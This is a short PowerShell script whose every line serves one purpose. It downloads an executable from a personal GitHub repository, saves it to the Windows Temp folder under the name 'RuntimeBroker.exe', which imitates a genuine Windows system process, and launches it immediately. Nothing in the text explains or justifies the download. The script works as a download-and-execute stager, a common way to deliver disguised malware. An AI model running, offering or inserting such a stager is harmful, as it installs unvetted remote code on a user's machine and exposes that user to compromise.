$url = "https://github.com/Xmadter/runtime/raw/refs/heads/main/RuntimeBroker.exe"
$out = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
